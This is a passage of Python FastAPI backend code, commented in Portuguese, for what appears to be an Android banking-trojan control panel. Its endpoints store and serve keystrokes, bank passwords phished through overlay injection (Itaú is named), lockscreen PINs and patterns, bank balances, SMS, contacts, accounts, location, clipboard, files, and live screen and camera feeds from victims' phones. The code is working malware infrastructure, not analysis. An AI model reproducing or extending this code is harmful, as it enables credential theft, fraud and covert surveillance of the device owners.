            start_of_day = target_date.replace(hour=0, minute=0, second=0, microsecond=0)
            end_of_day = target_date.replace(hour=23, minute=59, second=59, microsecond=999999)
            
            # UTC conversion (+3h)
            start_utc = start_of_day + timedelta(hours=3)
            end_utc = end_of_day + timedelta(hours=3)
            
            query = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type.in_(keylog_types),
                DeviceLog.created_at >= start_utc,
                DeviceLog.created_at <= end_utc
            )
        
        keylogs = query.order_by(DeviceLog.created_at.asc()).offset(offset).limit(limit).all()
        total = len(keylogs)
        
        result = []
        for log in keylogs:
            try:
                if isinstance(log.created_at, datetime):
                    created_dt = log.created_at
                elif isinstance(log.created_at, str):
                    created_dt = datetime.fromisoformat(log.created_at.replace('Z', ''))
                else:
                    created_dt = datetime.utcnow()
                time_str = (created_dt - timedelta(hours=3)).strftime("%H:%M:%S")
            except Exception:
                time_str = "--:--:--"

            try:
                data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
                
                if isinstance(data, str):
                    entry = {
                        "id": log.id,
                        "time": time_str,
                        "text": data,
                        "package": "",
                        "appName": "App",
                        "isPassword": log.log_type in ("BANK_PASSWORD", "CAPTURED_PIN", "CAPTURED_PATTERN"),
                        "eventType": log.log_type,
                        "isOffline": log.log_type == "KEYLOG_OFFLINE"
                    }
                else:
                    text_val = data.get("text") or data.get("password") or data.get("pin") or data.get("pattern") or ""
                    if not text_val and "captured" in data and isinstance(data["captured"], dict):
                        text_val = ", ".join([f"{k}: {v}" for k, v in data["captured"].items() if v])
                    entry = {
                        "id": log.id,
                        "time": time_str,
                        "text": text_val or f"[{log.log_type}]",
                        "package": data.get("package", "") if isinstance(data, dict) else "",
                        "appName": (data.get("appName") or data.get("bank") or "App") if isinstance(data, dict) else "App",
                        "isPassword": bool(data.get("isPassword") or log.log_type in ("BANK_PASSWORD", "CAPTURED_PIN", "CAPTURED_PATTERN")),
                        "eventType": (data.get("eventType") or log.log_type) if isinstance(data, dict) else log.log_type,
                        "hint": data.get("hint", "") if isinstance(data, dict) else "",
                        "fieldName": data.get("fieldName", "") if isinstance(data, dict) else "",
                        "isOffline": log.log_type == "KEYLOG_OFFLINE"
                    }
                
                if entry.get("text") or entry.get("eventType") or entry.get("hint") or entry.get("fieldName") or entry.get("isPassword"):
                    result.append(entry)
            except Exception as e:
                logger.error(f"Erro ao parsear log {log.id}: {e}")
                continue

        return {
            "date": target_date_str,
            "total": total,
            "offset": offset,
            "limit": limit,
            "entries": result
        }
    except Exception as e:
        logger.error(f"Erro em get_device_keylogs_by_date: {e}")
        return {
            "date": date or "",
            "total": 0,
            "offset": 0,
            "limit": limit,
            "entries": []
        }

@app.get("/api/devices/{device_id}/keylogs-dates")
async def get_device_keylogs_dates(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📆 Retorna lista de datas que têm keylogs registrados (ajustado para fuso BRT).
    """
    from datetime import timedelta
    from sqlalchemy import func
    
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    keylog_types = [
        "KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "DEVICE_NOTIFICATION",
        "CAPTURED_PIN", "CAPTURED_PATTERN", "OVERLAY_SUBMITTED", "CUSTOM_CAPTURES"
    ]
    
    # Converte timestamps UTC no banco para BRT (-3h) antes de extrair a data YYYY-MM-DD
    dates_query = db.query(
        func.date(func.datetime(DeviceLog.created_at, '-3 hours')).label('log_date'),
        func.count(DeviceLog.id).label('count')
    ).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).group_by(
        func.date(func.datetime(DeviceLog.created_at, '-3 hours'))
    ).order_by(
        func.date(func.datetime(DeviceLog.created_at, '-3 hours')).desc()
    ).limit(365).all()
    
    dates = []
    for row in dates_query:
        if row.log_date:
            dates.append({
                "date": str(row.log_date),
                "count": row.count
            })
    
    return dates

@app.get("/api/devices/{device_id}/keylogs-summary")
async def get_device_keylogs_summary(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    📊 Retorna resumo estatístico dos keylogs do dispositivo.
    """
    from datetime import datetime, timedelta
    import pytz
    
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # 🇧🇷 Timezone de Brasília
    brazil_tz = pytz.timezone('America/Sao_Paulo')
    now_brazil = datetime.now(brazil_tz)
    today_start_brt = now_brazil.replace(hour=0, minute=0, second=0, microsecond=0)
    today_start_utc = today_start_brt.replace(tzinfo=None) + timedelta(hours=3)
    
    keylog_types = [
        "KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "DEVICE_NOTIFICATION",
        "CAPTURED_PIN", "CAPTURED_PATTERN", "OVERLAY_SUBMITTED", "CUSTOM_CAPTURES"
    ]
    
    # Total de keylogs
    total = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).count()
    
    # Keylogs de hoje
    today = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types),
        DeviceLog.created_at >= today_start_utc
    ).count()
    
    # Senhas capturadas (isPassword = true)
    passwords = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types),
        DeviceLog.log_data.like('%"isPassword": true%')
    ).count()
    
    # Primeiro e último keylog
    first_log = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).order_by(DeviceLog.created_at.asc()).first()
    
    last_log = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(keylog_types)
    ).order_by(DeviceLog.created_at.desc()).first()
    
    return {
        "total_logs": total,
        "today_logs": today,
        "passwords_captured": passwords,
        "first_log_date": (first_log.created_at - timedelta(hours=3)).isoformat() if first_log else None,
        "last_log_date": (last_log.created_at - timedelta(hours=3)).isoformat() if last_log else None,
        "current_time_brazil": now_brazil.strftime("%Y-%m-%d %H:%M:%S")
    }

@app.get("/api/devices/{device_id}/lockscreen-pins")
async def get_device_lockscreen_pins(
    device_id: str,
    limit: int = 100,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    🔐 Retorna tentativas de captura de PIN/Pattern da lockscreen
    Inclui tanto online quanto offline
    """
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca keylogs que parecem ser de lockscreen
    keylogs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_([
            "KEYLOG", "KEYLOG_OFFLINE", 
            "UNLOCK_SEQUENCE", "UNLOCK_SEQUENCE_OFFLINE",
            "CAPTURED_PIN", "CAPTURED_PATTERN"
        ])
    ).order_by(DeviceLog.created_at.desc()).limit(500).all()
    
    pins = []
    for log in keylogs:
        try:
            data = json.loads(log.log_data) if isinstance(log.log_data, str) else log.log_data
            if isinstance(data, dict):
                # Verifica se é PIN de lockscreen
                event_type = data.get("eventType", "") or ("CAPTURED_PIN" if log.log_type == "CAPTURED_PIN" else "CAPTURED_PATTERN" if log.log_type == "CAPTURED_PATTERN" else "")
                package = data.get("package", "")
                
                is_lockscreen = (
                    "LOCKSCREEN" in event_type or
                    "systemui" in package.lower() or
                    "keyguard" in package.lower() or
                    log.log_type.startswith("UNLOCK_") or
                    log.log_type in ["CAPTURED_PIN", "CAPTURED_PATTERN"]
                )
                
                if is_lockscreen:
                    digit = data.get("pin") or data.get("pattern") or data.get("text", "")
                    pins.append({
                        "id": log.id,
                        "type": log.log_type,
                        "digit": digit,
                        "eventType": event_type,
                        "created_at": log.created_at.isoformat(),
                        "isOffline": "OFFLINE" in log.log_type
                    })
        except:
            pass
    
    return pins[:limit]

@app.get("/api/devices/{device_id}/bank-passwords")
async def get_bank_passwords(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna APENAS senhas e credenciais capturadas via Injects e Overlays"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca do banco de dados apenas os tipos de captura por Injects e Overlays
    passwords = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_([
            "BANK_PASSWORD", "CAPTURED_APP_PASSWORD", "CAPTURED_PIN", 
            "CAPTURED_PATTERN", "CUSTOM_CAPTURES"
        ])
    ).order_by(DeviceLog.created_at.desc()).limit(500).all()
    
    result = []
    seen_keys = set()
    for log in passwords:
        try:
            raw_data = log.log_data
            password_data = json.loads(raw_data) if isinstance(raw_data, str) and raw_data.strip().startswith('{') else {}
            
            if log.log_type == "BANK_PASSWORD":
                bank_name = password_data.get('bank') or password_data.get('appName') or 'Banco'
                pkg = password_data.get('package') or password_data.get('packageName') or password_data.get('package_name') or 'com.seguranca.protecao'
                pwd = str(password_data.get('password') or '')
                if not pwd:
                    continue
                dedup_key = f"{pkg}:{pwd}:{password_data.get('hint','')}"
                if dedup_key in seen_keys:
                    continue
                seen_keys.add(dedup_key)
                
                result.append({
                    "id": log.id,
                    "bank": bank_name,
                    "package": pkg,
                    "password": pwd,
                    "digits": password_data.get('digits') or len(pwd),
                    "hint": password_data.get('hint') or password_data.get('label') or 'SENHA INJECT',
                    "label": password_data.get('label') or 'Injeção Bancária',
                    "status": "captured",
                    "source": "INJECT_OVERLAY",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CAPTURED_APP_PASSWORD":
                pkg = password_data.get('package', '')
                pwd = str(password_data.get('password', ''))
                if not pwd:
                    continue
                bank_name = BankPasswordDetector.BANK_APPS.get(pkg, pkg.split('.')[-1].title() if '.' in pkg else 'App')
                dedup_key = f"{pkg}:{pwd}:app_pwd"
                if dedup_key in seen_keys:
                    continue
                seen_keys.add(dedup_key)
                
                result.append({
                    "id": log.id,
                    "bank": bank_name,
                    "package": pkg,
                    "password": pwd,
                    "digits": len(pwd),
                    "hint": "SENHA DE INJEÇÃO",
                    "label": "Injeção / Overlay",
                    "status": "captured",
                    "source": "INJECT_OVERLAY",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CAPTURED_PIN":
                pin = str(password_data.get('pin') or password_data.get('digit') or password_data.get('text') or '')
                if not pin:
                    continue
                dedup_key = f"pin:{pin}"
                if dedup_key in seen_keys:
                    continue
                seen_keys.add(dedup_key)
                
                result.append({
                    "id": log.id,
                    "bank": "Lockscreen Inject",
                    "package": "com.android.keyguard",
                    "password": pin,
                    "digits": len(pin),
                    "hint": "PIN LOCKSCREEN",
                    "label": "PIN de Tela (Inject)",
                    "status": "captured",
                    "source": "INJECT_LOCKSCREEN",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CAPTURED_PATTERN":
                pattern = str(password_data.get('pattern', ''))
                if not pattern:
                    continue
                dedup_key = f"pattern:{pattern}"
                if dedup_key in seen_keys:
                    continue
                seen_keys.add(dedup_key)
                
                result.append({
                    "id": log.id,
                    "bank": "Lockscreen Inject",
                    "package": "com.android.keyguard",
                    "password": pattern,
                    "digits": len(pattern.split('-')) if '-' in pattern else len(pattern),
                    "hint": "PADRÃO LOCKSCREEN",
                    "label": "Desenho (Inject)",
                    "status": "captured",
                    "source": "INJECT_LOCKSCREEN",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CUSTOM_CAPTURES":
                cap_data = password_data.get('captured_data', {})
                proj_name = password_data.get('project_name') or password_data.get('appName') or 'Overlay Custom'
                target_pkg = password_data.get('package') or cap_data.get('package') or 'custom.overlay'
                
                # Ignorar chaves de metadados internas
                metadata_keys = {
                    'package', 'packagename', 'appname', 'ispassword', 'is_password', 
                    'device_id', 'type', 'status', 'project_id', 'project_name', 
                    'timestamp', '_timestamp'
                }
                
                for k, v in cap_data.items():
                    k_lower = k.lower()
                    if k.startswith('_') or k_lower in metadata_keys:
                        continue
                    if v is None:
                        continue
                    v_str = str(v).strip()
                    if not v_str or v_str.lower() in ['true', 'false', 'none', 'null']:
                        continue
                    # Ignorar se o valor for exatamente o nome do pacote (ex: br.com.itau)
                    if v_str.lower() == target_pkg.lower():
                        continue
                        
                    dedup_key = f"custom:{target_pkg}:{v_str}"
                    if dedup_key in seen_keys:
                        continue
                    seen_keys.add(dedup_key)
                    
                    bank_display = BankPasswordDetector.BANK_APPS.get(target_pkg) or proj_name
                    if bank_display == 'Overlay Custom' and 'itau' in target_pkg.lower():
                        bank_display = 'Itaú'
                    
                    result.append({
                        "id": log.id,
                        "bank": bank_display,
                        "package": target_pkg,
                        "password": v_str,
                        "digits": len(v_str),
                        "hint": k.upper(),
                        "label": f"Injeção ({k})",
                        "status": "captured",
                        "source": "INJECT_OVERLAY",
                        "timestamp": log.created_at.isoformat()
                    })
        except Exception:
            pass
    
    return result

@app.post("/api/keylog/custom")
async def receive_custom_keylog(request: Request, db: Session = Depends(get_db)):
    """Recebe e registra senhas capturadas por páginas overlay HTML (como Itaú)"""
    try:
        data = await request.json()
        device_id = data.get("device_id") or "UNKNOWN"
        package = data.get("package") or "br.com.itau"
        app_name = data.get("appName") or "Itaú Oficial"
        text = data.get("text") or ""
        
        password_info = {
            'device_id': device_id,
            'bank': app_name,
            'package': package,
            'packageName': package,
            'password': text,
            'type': 'CAPTURED_PIN',
            'timestamp': utc_now().isoformat(),
            'field_name': 'Senha Overlay',
            'label': 'Senha Overlay',
            'hint': 'Senha Overlay',
            'source': 'HTML_OVERLAY',
            'isPassword': True
        }
        
        log_bank = DeviceLog(
            device_id=device_id,
            log_type="BANK_PASSWORD",
            log_data=json.dumps(password_info, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(log_bank)
        
        log_key = DeviceLog(
            device_id=device_id,
            log_type="KEYLOG",
            log_data=json.dumps({
                "package": package,
                "appName": app_name,
                "isPassword": True,
                "text": text,
                "timestamp": utc_now().isoformat()
            }, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(log_key)
        db.commit()
        
        try:
            await manager.broadcast_to_admins({
                "type": "BANK_PASSWORD_CAPTURED",
                "device_id": device_id,
                "data": password_info
            })
        except Exception:
            pass
            
        return {"status": "ok"}
    except Exception as e:
        logger.error(f"Erro ao registrar keylog customizado: {e}")
        return {"status": "error", "detail": str(e)}

@app.get("/api/devices/{device_id}/custom-captures")
async def get_device_custom_captures(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna dados capturados de telas customizadas do APK Studio"""
    check_device_access(device_id, current_user, db)
    
    captures = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "CUSTOM_CAPTURES"
    ).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    result = []
    for log in captures:
        try:
            payload = json.loads(log.log_data)
            result.append({
                "id": log.id,
                "project_id": payload.get("project_id"),
                "project_name": payload.get("project_name", "Custom Screen"),
                "captured_data": payload.get("captured_data", {}),
                "timestamp": log.created_at.isoformat()
            })
        except:
            pass
    return result

@app.delete("/api/devices/{device_id}/custom-captures/{log_id}")
async def delete_device_custom_capture(
    device_id: str,
    log_id: int,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Deleta uma captura customizada"""
    check_device_access(device_id, current_user, db)
    log = db.query(DeviceLog).filter(
        DeviceLog.id == log_id,
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "CUSTOM_CAPTURES"
    ).first()
    if not log:
        raise HTTPException(status_code=404, detail="Captura não encontrada")
    db.delete(log)
    db.commit()
    return {"ok": True}

@app.delete("/api/devices/{device_id}/logs/{log_id}")
async def delete_device_log(
    device_id: str,
    log_id: int,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Deleta um log específico do dispositivo"""
    check_device_access(device_id, current_user, db)
    log = db.query(DeviceLog).filter(DeviceLog.device_id == device_id, DeviceLog.id == log_id).first()
    if not log:
        raise HTTPException(status_code=404, detail="Log não encontrado")
    db.delete(log)
    db.commit()
    return {"status": "ok"}

@app.delete("/api/devices/{device_id}/logs/package/{package_name}")
async def delete_device_logs_by_package(
    device_id: str,
    package_name: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Deleta todos os logs de um pacote de app específico (banco)"""
    check_device_access(device_id, current_user, db)
    logs = db.query(DeviceLog).filter(DeviceLog.device_id == device_id).all()
    count = 0
    for log in logs:
        is_match = False
        if log.log_type in ["KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "BANK_BALANCE"]:
            try:
                data = json.loads(log.log_data)
                if isinstance(data, dict):
                    if data.get("package") == package_name:
                        is_match = True
            except:
                pass
        
        # fallback
        if not is_match and package_name in log.log_data:
            is_match = True
            
        if is_match:
            db.delete(log)
            count += 1
            
    db.commit()
    return {"status": "ok", "deleted_count": count}

@app.get("/api/devices/{device_id}/bank-balances")
async def get_bank_balances(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna os saldos bancários capturados do dispositivo"""
    check_device_access(device_id, current_user, db)
    
    # Busca os logs do tipo BANK_BALANCE
    balances = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "BANK_BALANCE"
    ).order_by(DeviceLog.created_at.desc()).limit(150).all()
    
    result = []
    for log in balances:
        try:
            data = json.loads(log.log_data)
            package = data.get("package")
            if package:
                result.append({
                    "id": log.id,
                    "bank": data.get("appName", data.get("bank", "Banco")),
                    "package": package,
                    "balance": data.get("balance"),
                    "credit_limit": data.get("credit_limit"),
                    "invoice": data.get("invoice"),
                    "timestamp": log.created_at.isoformat()
                })
        except Exception:
            pass
            
    return result

@app.get("/api/devices/{device_id}/clipboard")
async def get_device_clipboard(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna os logs de área de transferência (clipboard) do dispositivo."""
    check_device_access(device_id, current_user, db)
    logs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "CLIPBOARD"
    ).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    current_clip = manager.device_info.get(device_id, {}).get("clipboard")
    
    res = []
    for l in logs:
        try:
            parsed = json.loads(l.log_data)
            res.append({
                "id": l.id,
                "text": parsed.get("text") or l.log_data,
                "timestamp": l.created_at.isoformat()
            })
        except Exception:
            res.append({
                "id": l.id,
                "text": l.log_data,
                "timestamp": l.created_at.isoformat()
            })
    return {"current": current_clip, "history": res}

@app.post("/api/devices/{device_id}/clipboard")
async def set_device_clipboard(
    device_id: str,
    request: Request,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Injeta texto na área de transferência (clipboard) do dispositivo."""
    check_device_access(device_id, current_user, db)
    body = await request.json()
    text = body.get("text", "")
    if not text:
        raise HTTPException(status_code=400, detail="Texto não fornecido")
    await manager.send_command(device_id, {"action": "SET_CLIPBOARD", "text": text})
    return {"status": "ok", "message": f"Texto enviado para área de transferência: {text}"}

@app.get("/api/devices/{device_id}/uploaded-files")
async def get_uploaded_files(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna arquivos enviados pelo dispositivo (documentos, fotos, PDFs)"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca arquivos do banco de dados
    files = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "FILE_UPLOAD"
    ).order_by(DeviceLog.created_at.desc()).limit(50).all()
    
    result = []
    for log in files:
        try:
            file_data = json.loads(log.log_data)
            result.append({
                "id": log.id,
                "label": file_data.get('label'),
                "fileName": file_data.get('fileName'),
                "mimeType": file_data.get('mimeType'),
                "data": file_data.get('data'),  # Base64
                "timestamp": log.created_at.isoformat()
            })
        except:
            pass
    
    return result

@app.get("/api/devices/{device_id}/screen-hierarchy")
async def get_device_screen_hierarchy(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna hierarquia da tela atual (Screen Reader V2) com disparo automático de captura"""
    check_device_access(device_id, current_user, db)
    
    # Solicita atualização em tempo real do leitor de tela V2 ao aparelho
    asyncio.create_task(manager.send_command(device_id, {"action": "TOGGLE_SCREEN_READER", "enabled": True}))
    asyncio.create_task(manager.send_command(device_id, {"action": "REQUEST_HIERARCHY"}))
    
    hierarchy = manager.get_latest_hierarchy(device_id, max_age_seconds=5.0)
    
    if hierarchy:
        return {
            "status": "ok",
            "data": hierarchy
        }
    else:
        return {
            "status": "empty",
            "data": None
        }


@app.get("/api/devices/{device_id}/unlock-sequence")
async def get_device_unlock_sequence(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔓 Retorna sequência de desbloqueio gravada"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    sequence = manager.get_unlock_sequence(device_id)
    
    if sequence:
        return {
            "status": "ok",
            "type": sequence.get("type", "unknown"),
            "sequence": sequence.get("sequence", []),
            "count": sequence.get("count", 0)
        }
    else:
        return {
            "status": "empty",
            "type": "none",
            "sequence": [],
            "count": 0
        }


# ==================== API DE APPS INSTALADOS ====================

@app.get("/api/devices/{device_id}/apps")
@app.get("/api/devices/{device_id}/installed-apps")
async def get_device_installed_apps(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📱 Retorna lista de apps instalados no dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    apps = manager.get_installed_apps(device_id)
    
    if apps:
        return {
            "status": "ok",
            "apps": apps,
            "count": len(apps),
            "source": "memory"
        }
    else:
        # Tenta carregar do cache persistido no banco de dados
        try:
            cached = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type == "INSTALLED_APPS_CACHE"
            ).order_by(DeviceLog.created_at.desc()).first()
            
            if cached:
                data = json.loads(cached.log_data)
                apps_list = data.get("apps", [])
                # Restaura na memória também
                manager.store_installed_apps(device_id, apps_list)
                return {
                    "status": "ok",
                    "apps": apps_list,
                    "count": len(apps_list),
                    "source": "db_cache"
                }
        except Exception as e:
            logger.error(f"Erro ao restaurar apps do cache: {e}")
        
        return {
            "status": "empty",
            "apps": [],
            "count": 0
        }


@app.post("/api/devices/{device_id}/refresh-apps")
async def refresh_device_apps(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📱 Solicita atualização da lista de apps"""
    check_device_access(device_id, current_user, db)
    success = await manager.send_command(device_id, {"action": "GET_INSTALLED_APPS"})
    return {"status": "ok" if success else "error", "message": "Comando GET_INSTALLED_APPS enviado ao dispositivo"}


@app.get("/api/devices/{device_id}/sms")
async def get_device_sms(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """💬 Retorna mensagens SMS capturadas do dispositivo"""
    check_device_access(device_id, current_user, db)
    
    cap = db.query(CapturedData).filter(
        CapturedData.device_id == device_id,
        CapturedData.data_type == "SMS"
    ).order_by(CapturedData.id.desc()).first()
    
    if cap and cap.data_content:
        try:
            sms_list = json.loads(cap.data_content)
            return {"status": "ok", "sms": sms_list, "source": "captured_data"}
        except Exception:
            pass
            
    logs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(["SMS", "SMS_LIST", "DEVICE_NOTIFICATION"])
    ).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    res = []
    for l in logs:
        try:
            data = json.loads(l.log_data)
            res.append(data)
        except Exception:
            res.append({"body": l.log_data, "date": l.created_at.isoformat()})
            
    return {"status": "ok", "sms": res, "source": "device_logs"}


@app.get("/api/devices/{device_id}/contacts")
async def get_device_contacts(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """👥 Retorna contatos capturados da agenda do dispositivo"""
    check_device_access(device_id, current_user, db)
    
    cap = db.query(CapturedData).filter(
        CapturedData.device_id == device_id,
        CapturedData.data_type == "CONTACTS"
    ).order_by(CapturedData.id.desc()).first()
    
    if cap and cap.data_content:
        try:
            contacts = json.loads(cap.data_content)
            return {"status": "ok", "contacts": contacts, "source": "captured_data"}
        except Exception:
            pass
            
    return {"status": "empty", "contacts": []}


@app.get("/api/devices/{device_id}/google-accounts")
@app.get("/api/devices/{device_id}/accounts")
async def get_device_google_accounts(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📧 Retorna as contas Google e do sistema registradas no dispositivo"""
    check_device_access(device_id, current_user, db)
    
    cap = db.query(CapturedData).filter(
        CapturedData.device_id == device_id,
        CapturedData.data_type.in_(["GOOGLE_ACCOUNTS", "ACCOUNTS"])
    ).order_by(CapturedData.id.desc()).first()
    
    if cap and cap.data_content:
        try:
            accs = json.loads(cap.data_content)
            if isinstance(accs, list) and len(accs) > 0:
                return {"status": "ok", "accounts": accs, "google_accounts": accs, "count": len(accs), "source": "captured_data"}
        except Exception:
            pass

    logs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_data.like("%@%")
    ).order_by(DeviceLog.created_at.desc()).limit(200).all()
    
    found_emails = set()
    import re
    email_regex = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
    
    for l in logs:
        if l.log_data:
            matches = email_regex.findall(l.log_data)
            for m in matches:
                if not any(ign in m.lower() for ign in ['schema.org', 'w3.org', 'example.com', 'google.com/']):
                    found_emails.add(m)
                    
    acc_list = sorted(list(found_emails))
    return {"status": "ok" if acc_list else "empty", "accounts": acc_list, "google_accounts": acc_list, "count": len(acc_list), "source": "logs"}



@app.get("/api/devices/{device_id}/location")
async def get_device_location(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📍 Retorna última localização GPS registrada do dispositivo"""
    check_device_access(device_id, current_user, db)
    
    cap = db.query(CapturedData).filter(
        CapturedData.device_id == device_id,
        CapturedData.data_type == "LOCATION"
    ).order_by(CapturedData.id.desc()).first()
    
    if cap and cap.data_content:
        try:
            loc = json.loads(cap.data_content)
            return {"status": "ok", "location": loc, "source": "captured_data"}
        except Exception:
            pass
            
    return {"status": "empty", "location": None}


@app.get("/api/devices/{device_id}/file-list")
async def get_device_file_list(
    device_id: str,
    path: str = Query("/sdcard"),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📁 Retorna lista de arquivos do diretório remoto do dispositivo"""
    check_device_access(device_id, current_user, db)
    
    cap = db.query(CapturedData).filter(
        CapturedData.device_id == device_id,
        CapturedData.data_type == f"FILE_LIST_{path}"
    ).order_by(CapturedData.id.desc()).first()
    
    if cap and cap.data_content:
        try:
            parsed = json.loads(cap.data_content)
            return {"status": "ok", "path": path, "files": parsed.get("files", []), "source": "captured_data"}
        except Exception:
            pass
            
    return {"status": "empty", "path": path, "files": []}
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Envia comando para o dispositivo
    success = await manager.send_command(device_id, {"action": "GET_INSTALLED_APPS"})
    
    if success:
        return {"status": "ok", "message": "Solicitação enviada"}
    else:
        raise HTTPException(status_code=404, detail="Dispositivo não conectado")


@app.post("/api/devices/{device_id}/unlock-sequence")
async def save_device_unlock_sequence(
    device_id: str,
    data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔓 Salva sequência de desbloqueio gravada via VNC"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    sequence_type = data.get("type", "unknown")
    sequence = data.get("sequence", [])
    
    if sequence:
        manager.store_unlock_sequence(device_id, {
            "type": sequence_type,
            "sequence": sequence,
            "count": len(sequence)
        })
        logger.info(f"🔓 Sequência de desbloqueio salva para {device_id}: {len(sequence)} ações ({sequence_type})")
        return {
            "status": "ok",
            "message": f"Sequência salva: {len(sequence)} ações"
        }
    else:
        return {
            "status": "error",
            "message": "Nenhuma ação na sequência"
        }


@app.websocket("/ws/dashboard/{device_id}")
async def dashboard_stream(websocket: WebSocket, device_id: str):
    """WebSocket que entrega frames em tempo real para o painel"""
    operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
    if not operator:
        return
    
    queue = await manager.register_dashboard_client(device_id, websocket)
    
    try:
        _send_errors = 0
        while True:
            try:
                frame = await asyncio.wait_for(queue.get(), timeout=15.0)
                
                # Drena frames extras acumulados - entrega só o mais recente
                latest = frame
                while not queue.empty():
                    try:
                        latest = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                
                await websocket.send_bytes(latest)
                _send_errors = 0
            except asyncio.TimeoutError:
                try:
                    await websocket.send_bytes(b'')
                except Exception:
                    break
            except RuntimeError as e:
                if "disconnect" in str(e).lower() or "closed" in str(e).lower():
                    break
                _send_errors += 1
                if _send_errors > 5:
                    break
            except Exception:
                _send_errors += 1
                if _send_errors > 5:
                    break
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        if "disconnect" not in str(exc).lower() and "closed" not in str(exc).lower():
            logger.warning(f"Erro no dashboard WS ({device_id}): {type(exc).__name__}")
    finally:
        manager.unregister_dashboard_client(device_id, websocket)


@app.websocket("/ws/camera/{device_id}")
async def camera_stream(websocket: WebSocket, device_id: str):
    """📷 WebSocket que entrega frames de câmera em tempo real"""
    operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
    if not operator:
        return
    
    queue = await manager.register_camera_client(device_id, websocket)
    
    try:
        while True:
            try:
                frame = await asyncio.wait_for(queue.get(), timeout=30.0)
                await websocket.send_bytes(frame)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_bytes(b'')
                except Exception:
                    break
            except RuntimeError as e:
                if "disconnect" in str(e).lower() or "closed" in str(e).lower():
                    break
                raise
